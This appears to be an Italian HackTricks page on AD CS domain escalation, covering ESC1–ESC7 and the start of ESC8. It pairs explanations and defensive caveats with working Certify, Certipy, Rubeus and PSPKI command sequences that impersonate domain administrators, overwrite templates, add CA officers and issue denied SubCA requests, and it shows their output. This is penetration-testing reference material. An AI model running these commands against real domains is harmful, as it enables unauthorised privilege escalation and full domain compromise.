# Escalatione di dominio AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Questo è un riepilogo delle sezioni sulle tecniche di escalation dei post:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Modelli di certificato configurati in modo errato - ESC1

### Spiegazione

### Spiegazione di ESC1: modelli di certificato configurati in modo errato

- **L'Enterprise CA concede diritti di registrazione agli utenti con privilegi ridotti.**
- **Non è richiesta l'approvazione del manager.**
- **Non sono necessarie firme del personale autorizzato.**
- **I descrittori di sicurezza dei modelli di certificato sono troppo permissivi e consentono agli utenti con privilegi ridotti di ottenere diritti di registrazione.**
- **I modelli di certificato sono configurati per definire EKU che facilitano l'autenticazione:**
  - Sono inclusi identificatori Extended Key Usage (EKU) come Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) oppure nessun EKU (SubCA).
- **Il modello consente ai richiedenti di includere un subjectAltName nella Certificate Signing Request (CSR):**
  - Se presente, Active Directory (AD) dà priorità al subjectAltName (SAN) di un certificato per la verifica dell'identità. Ciò significa che, specificando il SAN in una CSR, è possibile richiedere un certificato per impersonare qualsiasi utente (ad esempio, un amministratore di dominio). La possibilità per il richiedente di specificare un SAN è indicata nell'oggetto AD del modello di certificato tramite la proprietà `mspki-certificate-name-flag`. Questa proprietà è una bitmask e la presenza del flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` consente al richiedente di specificare il SAN.

> [!CAUTION]
> Queste impostazioni identificano un possibile modello ESC1, non un percorso di impersonificazione completo. Verifica che il principal di destinazione possa registrarsi presso una CA che pubblica il modello, che la registrazione presso la CA sia consentita e che il certificato rilasciato soddisfi le regole di mapping SID forte dell'endpoint di autenticazione. I KDC aggiornati possono rifiutare un UPN richiesto se il SID del certificato non corrisponde a quello dell'utente di destinazione; consulta le [indicazioni di Microsoft sul mapping dei certificati](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

I diritti di registrazione concessi a **Domain Computers** possono rendere idonea un'identità computer predisposta anche quando l'utente originale non può registrarsi. Valuta separatamente i diritti del principal computer. Controlla `msPKI-Minimal-Key-Size` prima di inviare una richiesta: un modello che richiede chiavi RSA a 4096 bit rifiuta la chiave predefinita a 2048 bit del client. Un SID di destinazione fornito nella richiesta può risolvere una mancata corrispondenza dei SID solo se la CA e il KDC accettano il certificato risultante e il relativo mapping; né i flag del modello né un ACE Enroll, da soli, lo dimostrano.

Questa funzionalità è talvolta abilitata per supportare la generazione al volo di certificati HTTPS o host da parte di prodotti o servizi di deployment, oppure per mancanza di consapevolezza.

Si noti che la creazione di un certificato con questa opzione attiva un avviso, cosa che non avviene quando si duplica un modello di certificato esistente (come il modello `WebServer`, che ha `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` abilitato) e lo si modifica per includere un OID di autenticazione.<sup>[[6]](#references)</sup>

### Abuso

Per **trovare modelli di certificato vulnerabili**, puoi eseguire:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Per **sfruttare questa vulnerabilità e impersonare un amministratore** si potrebbe eseguire:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Quindi puoi convertire il **certificato generato in formato `.pfx`** e usarlo per **autenticarti di nuovo con Rubeus o certipy**:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

I binari Windows "Certreq.exe" e "Certutil.exe" possono essere usati per generare il PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

L'enumerazione dei template di certificato nello schema di configurazione della foresta AD, in particolare quelli che non richiedono approvazione o firme, che possiedono un EKU Client Authentication o Smart Card Logon e con il flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` abilitato, può essere eseguita eseguendo la seguente query LDAP:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Modelli di certificato configurati in modo errato - ESC2

### Spiegazione

Il secondo scenario di abuso è una variante del primo:

1. L’Enterprise CA concede diritti di enrollment agli utenti con privilegi ridotti.
2. Il requisito di approvazione del manager è disabilitato.
3. Il requisito di firme autorizzate è omesso.
4. Un descrittore di sicurezza eccessivamente permissivo sul modello di certificato concede diritti di enrollment agli utenti con privilegi ridotti.
5. **Il modello di certificato è definito in modo da includere l’EKU Any Purpose oppure nessun EKU.**

L’**EKU Any Purpose** consente a un attacker di ottenere un certificato per **qualsiasi scopo**, inclusi l’autenticazione client, l’autenticazione server, il code signing, ecc. Per sfruttare questo scenario è possibile utilizzare la stessa **tecnica usata per ESC3**.

I certificati **senza EKU**, che fungono da certificati CA subordinati, possono essere sfruttati per **qualsiasi scopo** e possono **anche essere usati per firmare nuovi certificati**. Pertanto, un attacker potrebbe specificare EKU o campi arbitrari nei nuovi certificati utilizzando un certificato CA subordinato.

Tuttavia, i nuovi certificati creati per l’**autenticazione di dominio** non funzioneranno se la CA subordinata non è considerata attendibile dall’oggetto **`NTAuthCertificates`**, impostazione predefinita. Ciononostante, un attacker può comunque creare **nuovi certificati con qualsiasi EKU** e valori di certificato arbitrari. Questi potrebbero essere potenzialmente **sfruttati** per un’ampia gamma di scopi (ad es. code signing, autenticazione server, ecc.) e avere implicazioni significative per altre applicazioni della rete, come SAML, AD FS o IPSec.<sup>[[6]](#references)</sup>

Per enumerare i modelli corrispondenti a questo scenario nello schema di configurazione dell’AD Forest, è possibile eseguire la seguente query LDAP:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Template dell'agente di registrazione configurati in modo errato - ESC3

### Spiegazione

Questo scenario è simile al primo e al secondo, ma **abusa** di un **EKU diverso** (Certificate Request Agent) e di **2 template diversi** (quindi ha 2 serie di requisiti),

L'**EKU Certificate Request Agent** (OID 1.3.6.1.4.1.311.20.2.1), noto come **Enrollment Agent** nella documentazione Microsoft, consente a un principal di **richiedere** un **certificato** **per conto di un altro utente**.

L'**“agente di registrazione”** richiede un certificato tramite un **template** di questo tipo e usa il **certificato risultante per controfirmare una CSR per conto dell'altro utente**. Quindi **invia** la **CSR controfirmata** alla CA, richiedendo un certificato tramite un **template** che **consente la “registrazione per conto di”**, e la CA risponde con un **certificato appartenente all'“altro” utente**.<sup>[[6]](#references)</sup>

**Requisiti 1:**

- La Enterprise CA concede agli utenti con privilegi bassi i diritti di registrazione.
- Il requisito di approvazione del manager è omesso.
- Non è richiesta alcuna firma autorizzata.
- Il descrittore di sicurezza del template del certificato è eccessivamente permissivo e concede i diritti di registrazione agli utenti con privilegi bassi.
- Il template del certificato include l'EKU Certificate Request Agent, che consente di richiedere altri template di certificati per conto di altri principal.

**Requisiti 2:**

- La Enterprise CA concede agli utenti con privilegi bassi i diritti di registrazione.
- L'approvazione del manager è aggirata.
- Un template di destinazione di versione 1 può accettare un agente di registrazione senza i controlli più recenti e granulari delle issuance policy; per la versione 2 o successive, valutare i requisiti di issuance policy delle application policy e le firme autorizzate, anziché escludere il template basandosi solo sulla versione.
- Un EKU definito nel template del certificato consente l'autenticazione nel dominio.
- Sulla CA non sono applicate restrizioni per gli agenti di registrazione.

Il template di destinazione deve inoltre essere pubblicato dalla CA scelta, consentire all'account di destinazione di registrarsi e supportare l'uso previsto per l'autenticazione nel dominio. Verificare gli attributi subject/SAN richiesti per quell'account; ad esempio, un template che ricava l'email del subject da AD non può rilasciare un certificato per un account privo del valore `mail` richiesto. Il solo certificato dell'agente non soddisfa questi requisiti del template di destinazione.

### Abuso

Puoi usare [**Certify**](https://github.com/GhostPack/Certify) o [**Certipy**](https://github.com/ly4k/Certipy) per abusare di questo scenario:<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

Gli **utenti** autorizzati a **ottenere** un **certificato enrollment agent**, i modelli per i quali gli **agenti** possono richiedere certificati e gli **account** per conto dei quali l’enrollment agent può agire possono essere limitati dalle CA enterprise. Per farlo, apri lo **snap-in** `certsrc.msc`, fai **clic con il pulsante destro del mouse sulla CA**, fai **clic su Properties** e poi **vai** alla scheda “Enrollment Agents”.

Tuttavia, l’impostazione **predefinita** delle CA è “**Do not restrict enrollment agents**.” Quando gli amministratori abilitano le restrizioni per gli enrollment agent selezionando “Restrict enrollment agents”, la configurazione predefinita rimane estremamente permissiva. Consente a **Everyone** di richiedere certificati tramite tutti i modelli impersonando chiunque.

### PoC PowerShell solo per Windows con Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) esegue test per ESC1 ed ESC2/ESC3 senza Certify o Certipy. I suoi script creano una chiave RSA esportabile a 2048 bit con l’API COM `X509Enrollment`, generano una richiesta PKCS#10, individuano tramite LDAP il primo `pKIEnrollmentService`, la inviano tramite `CertificateAuthority.Request`, installano la risposta in `Cert:\CurrentUser\My` ed esportano un PFX codificato in Base64. Lo script ESC1 aggiunge un SAN UPN scelto dall’attaccante (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, valore `0xb`), mentre gli script ESC2/ESC3 usano il primo certificato per firmare una richiesta PKCS#7 per conto di un altro utente.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Gli script stampano il Base64 del **PFX**, che include la chiave privata, per usarlo direttamente con Rubeus. Non sostituirlo con `[Convert]::ToBase64String($cert.RawData)`: `RawData` codifica solo il certificato pubblico e non può firmare la richiesta PKINIT.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Controllo degli accessi vulnerabile ai certificate template - ESC4

### **Spiegazione**

Il **security descriptor** sui **certificate template** definisce le **permissions** specifiche che i **principal AD** possiedono sul template.

Se un **attaccante** possiede le **permissions** necessarie per **modificare** un **template** e **introdurre** una delle **misconfigurations sfruttabili** descritte nelle **sezioni precedenti**, è possibile facilitare un'escalation dei privilegi.

Tra le permissions rilevanti applicabili ai certificate template figurano:<sup>[[6]](#references)</sup>

- **Owner:** Concede il controllo implicito sull'oggetto, consentendo di modificare qualsiasi attributo.
- **FullControl:** Consente il controllo completo dell'oggetto, inclusa la possibilità di modificarne qualsiasi attributo.
- **WriteOwner:** Consente di modificare il proprietario dell'oggetto assegnandolo a un principal sotto il controllo dell'attaccante.
- **WriteDacl:** Consente di modificare i controlli di accesso, concedendo potenzialmente FullControl all'attaccante.
- **WriteProperty:** Autorizza la modifica di qualsiasi proprietà dell'oggetto.

Esamina anche la DACL del contenitore `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`. Una ACE `CreateChild` applicabile e con ambito limitato alla classe [`pKICertificateTemplate`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c), oppure un controllo completo e ampio, può consentire di creare un nuovo oggetto template. [Microsoft documenta](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) che il contenitore ospita questi oggetti template. Esamina le ACE deny corrispondenti e l'ereditarietà prima di stabilire se la creazione sia effettivamente possibile. La creazione di un template non comporta di per sé il rilascio di un certificato: una CA deve pubblicarlo, il principal richiedente deve disporre dell'accesso di enrollment e il certificato deve essere associato all'identità prevista presso l'endpoint di autenticazione.

### Abuso

Per individuare i principal con diritti di modifica sui template e su altri oggetti PKI, esegui l'enumerazione con Certify:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

Un esempio di privesc simile al precedente:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 si verifica quando un utente dispone di privilegi di scrittura su un modello di certificato. Ad esempio, è possibile sfruttare questa situazione per sovrascrivere la configurazione del modello e renderlo vulnerabile a ESC1.

Un modello che consente già al richiedente di specificare il subject, ma che prevede solo l'uso Server Authentication, non è di per sé un modello per l'accesso degli utenti. Se dispone di diritti effettivi di controllo sul modello, un attaccante potrebbe modificarne gli EKU di autenticazione o le application policy prima di richiedere un certificato; [Microsoft documenta la funzione di accesso dell'EKU Smartcard Logon](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). Verifica che una CA pubblichi il modello modificato, che il richiedente possa iscriversi, che i requisiti di approvazione/firma siano soddisfatti e che il certificato emesso venga associato all'account desiderato. In particolare, [i controller di dominio aggiornati con Full Enforcement](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) rifiutano i certificati senza una mappatura forte; aggiungere l'UPN di un utente target a una richiesta non aggira questo requisito.

Come possiamo vedere nel percorso qui sopra, solo `JOHNPC` dispone di questi privilegi, ma il nostro utente `JOHN` ha il nuovo edge `AddKeyCredentialLink` verso `JOHNPC`. Poiché questa tecnica è legata ai certificati, ho implementato anche questo attacco, noto come [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Ecco una breve anteprima del comando `shadow auto` di Certipy per recuperare l'hash NT della vittima.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** può sovrascrivere la configurazione di un template di certificato con un singolo comando. Per **default**, Certipy **sovrascrive** la configurazione per renderla **vulnerabile a ESC1**. Possiamo anche specificare il parametro **`-save-old` per salvare la vecchia configurazione**, utile per **ripristinare** la configurazione dopo il nostro attack.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Controllo degli accessi agli oggetti PKI vulnerabile - ESC5

### Spiegazione

L’ampia rete di relazioni interconnesse basate su ACL, che comprende diversi oggetti oltre ai template dei certificati e all’autorità di certificazione, può influire sulla sicurezza dell’intero sistema AD CS. Tra questi oggetti, che possono compromettere significativamente la sicurezza, figurano:

- L’oggetto computer AD del server CA, che può essere compromesso tramite meccanismi come S4U2Self o S4U2Proxy.
- Il server RPC/DCOM del server CA.
- Qualsiasi oggetto AD discendente o contenitore all’interno del percorso specifico del contenitore `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Questo percorso include, a titolo esemplificativo ma non esaustivo, contenitori e oggetti come il contenitore Certificate Templates, il contenitore Certification Authorities, l’oggetto NTAuthCertificates e il contenitore Enrollment Services.

La sicurezza del sistema PKI può essere compromessa se un attaccante con pochi privilegi riesce a ottenere il controllo di uno qualsiasi di questi componenti critici.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Spiegazione

L’argomento trattato nel [**post di CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) affronta anche le implicazioni del flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, come indicato da Microsoft. Quando questa configurazione è attivata su un’autorità di certificazione (CA), consente di includere **valori definiti dall’utente** nel **subject alternative name** di **qualsiasi richiesta**, comprese quelle create da Active Directory®. Di conseguenza, questa impostazione consente a un **intruso** di richiedere un certificato tramite **qualsiasi template** configurato per l’**autenticazione** nel dominio, in particolare quelli aperti alla registrazione da parte di utenti **senza privilegi**, come il template User standard. In questo modo, è possibile ottenere un certificato che consente all’intruso di autenticarsi come amministratore di dominio o come **qualsiasi altra entità attiva** all’interno del dominio.<sup>[[9]](#references)</sup>

**Nota**: Il metodo per aggiungere **nomi alternativi** a una Certificate Signing Request (CSR) tramite l’argomento `-attrib "SAN:"` in `certreq.exe` (chiamato “Name Value Pairs”) è **diverso** dalla strategia di sfruttamento dei SAN in ESC1. La differenza consiste nel **modo in cui le informazioni dell’account vengono incorporate**: in un attributo del certificato anziché in un’estensione.

### Abuso

Per verificare se l’impostazione è attivata, le organizzazioni possono usare il seguente comando con `certutil.exe`:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Questa operazione impiega essenzialmente l'**accesso remoto al registro**, quindi un approccio alternativo potrebbe essere:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Strumenti come [**Certify**](https://github.com/GhostPack/Certify) e [**Certipy**](https://github.com/ly4k/Certipy) sono in grado di rilevare questa configurazione errata e sfruttarla:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Per modificare queste impostazioni, supponendo di disporre di **privilegi di amministratore di dominio** o equivalenti, è possibile eseguire il seguente comando da qualsiasi workstation:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Per disabilitare questa configurazione nel tuo ambiente, il flag può essere rimosso con:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Dopo gli aggiornamenti di sicurezza di maggio 2022, i **certificates** di nuova emissione conterranno una **security extension** che incorpora la proprietà `objectSid` del **requester**. Per ESC1, questo SID deriva dal SAN specificato. Tuttavia, per **ESC6**, il SID rispecchia `objectSid` del **requester**, non il SAN.\
> Per sfruttare ESC6, è essenziale che il sistema sia vulnerabile a ESC10 (Weak Certificate Mappings), che dà priorità al **SAN rispetto alla nuova security extension**.

## Controllo degli accessi vulnerabile della Certificate Authority - ESC7

### Attacco 1

#### Spiegazione

Il controllo degli accessi per una certificate authority è gestito tramite un insieme di autorizzazioni che regolano le azioni della CA. È possibile visualizzare queste autorizzazioni aprendo `certsrv.msc`, facendo clic con il tasto destro su una CA, selezionando le proprietà e quindi aprendo la scheda Sicurezza. Inoltre, è possibile enumerare le autorizzazioni usando il modulo PSPKI con comandi come:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

Questo fornisce informazioni sui diritti principali, ovvero **`ManageCA`** e **`ManageCertificates`**, corrispondenti rispettivamente ai ruoli di “amministratore della CA” e “Certificate Manager”.<sup>[[6]](#references)</sup>

#### Abuse

I diritti **`ManageCA`** su un'autorità di certificazione consentono all'entità di manipolare da remoto le impostazioni tramite PSPKI. Ciò include l'attivazione del flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** per consentire di specificare il SAN in qualsiasi template, un aspetto fondamentale per l'escalation del dominio.

È possibile semplificare questo processo usando il cmdlet **Enable-PolicyModuleFlag** di PSPKI, che consente di apportare modifiche senza interagire direttamente con la GUI.

I diritti **`ManageCertificates`** consentono di approvare le richieste in sospeso, aggirando di fatto la protezione “approvazione del Certificate Manager della CA”.

È possibile usare una combinazione dei moduli **Certify** e **PSPKI** per richiedere, approvare e scaricare un certificato:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Attack 2

#### Spiegazione

> [!WARNING]
> Nel **precedente attacco**, le autorizzazioni **`Manage CA`** sono state usate per **abilitare** il flag **EDITF_ATTRIBUTESUBJECTALTNAME2** ed eseguire l’attacco **ESC6**, ma questo non avrà alcun effetto finché il servizio CA (`CertSvc`) non viene riavviato. Quando un utente dispone del diritto di accesso `Manage CA`, può anche **riavviare il servizio**. Tuttavia, questo **non significa che l’utente possa riavviare il servizio da remoto**. Inoltre, E**SC6 potrebbe non funzionare immediatamente** nella maggior parte degli ambienti con le patch applicate, a causa degli aggiornamenti di sicurezza di maggio 2022.

Viene quindi presentato un altro attacco.

Prerequisiti:

- Solo l’autorizzazione **`ManageCA`**
- L’autorizzazione **`Manage Certificates`** (concedibile da **`ManageCA`**)
- Il template di certificato **`SubCA`** deve essere **abilitato** (abilitabile da **`ManageCA`**)

La tecnica si basa sul fatto che gli utenti con i diritti di accesso `Manage CA` _e_ `Manage Certificates` possono **emettere richieste di certificato non riuscite**. Il template di certificato **`SubCA`** è **vulnerabile a ESC1**, ma solo gli amministratori possono iscriversi al template. Pertanto, un **utente** può **richiedere** di iscriversi a **`SubCA`**: la richiesta verrà **rifiutata**, ma **in seguito il responsabile la emetterà**.<sup>[[6]](#references)</sup>

#### Abuso

Puoi **concederti il diritto di accesso `Manage Certificates`** aggiungendo il tuo utente come nuovo officer.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

Il template **`SubCA`** può essere **abilitato sulla CA** con il parametro `-enable-template`. Per impostazione predefinita, il template `SubCA` è abilitato.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Se abbiamo soddisfatto i prerequisiti per questo attacco, possiamo iniziare **richiedendo un certificato basato sul template `SubCA`**.

La richiesta verrà rifiuta**ta**, ma salveremo la chiave privata e annoteremo l'ID della richiesta.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Con i nostri **`Manage CA` e `Manage Certificates`**, possiamo quindi **emettere la richiesta di certificato non riuscita** con il comando `ca` e il parametro `-issue-request <request ID>`.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

Infine, possiamo **recuperare il certificato emesso** con il comando `req` e il parametro `-retrieve <request ID>`.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Attack 3 – Abuso dell’estensione Manage Certificates (SetExtension)

#### Spiegazione

Oltre ai classici abusi ESC7 (abilitare gli attributi EDITF o approvare richieste in sospeso), **Certify 2.0** ha rivelato una primitiva completamente nuova, che richiede solo il ruolo *Manage Certificates* (ovvero **Certificate Manager / Officer**) sulla Enterprise CA.<sup>[[3]](#references)</sup>

Il metodo RPC `ICertAdmin::SetExtension` può essere eseguito da qualsiasi principal che disponga del ruolo *Manage Certificates*. Sebbene in passato il metodo fosse usato dalle CA legittime per aggiornare le estensioni delle richieste **in sospeso**, un attacker può abusarne per **aggiungere un’estensione del certificato *non predefinita*** (ad esempio un OID personalizzato di *Certificate Issuance Policy*, come `1.1.1.1`) a una richiesta in attesa di approvazione.

Poiché il template interessato **non definisce un valore predefinito per quell’estensione**, la CA NON sovrascriverà il valore controllato dall’attacker quando la richiesta verrà infine emessa. Il certificato risultante conterrà quindi un’estensione scelta dall’attacker, che può:

* Soddisfare i requisiti di Application Policy / Issuance Policy di altri template vulnerabili (con conseguente escalation dei privilegi).
* Iniettare EKU o policy aggiuntivi che conferiscono al certificato una fiducia inaspettata nei sistemi di terze parti.

In breve, *Manage Certificates* — precedentemente considerato la parte «meno potente» di ESC7 — può ora essere sfruttato per ottenere una completa escalation dei privilegi o una persistenza a lungo termine, senza modificare la configurazione della CA né richiedere il diritto più restrittivo *Manage CA*.

#### Sfruttare la primitiva con Certify 2.0

1. **Inviare una richiesta di certificato che rimanga *in sospeso*.** Questo si può forzare usando un template che richiede l’approvazione del manager:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Aggiungi un'estensione personalizzata alla richiesta in sospeso** usando il nuovo comando `manage-ca`:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *Se il modello non definisce già l'estensione *Certificate Issuance Policies*, il valore precedente verrà mantenuto dopo l'emissione.*

3. **Invia la richiesta** (se il tuo ruolo dispone anche dei diritti di approvazione *Manage Certificates*) oppure attendi che un operatore la approvi. Una volta emesso, scarica il certificato:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. Il certificato risultante ora contiene l’OID della issuance policy malevola e può essere utilizzato in attacchi successivi (ad es. ESC13, escalation dei privilegi nel dominio, ecc.).

> NOTA: lo stesso attacco può essere eseguito con Certipy ≥ 4.7 tramite il comando `ca` e il parametro `-set-extension`.

## NTLM Relay verso endpoint HTTP di AD CS – ESC8

### Spiegazione

> [!TIP]
> Negli ambienti in cui è installato **AD CS**, se esiste un **endpoint web enrollment vulnerabile** e almeno un **certificate template pubblicato** consente l’enrollment dei computer del dominio e l’autenticazione client (come il template predefinito **`Machine`**), un attacker può compromettere **qualsiasi computer con il servizio spooler attivo**!

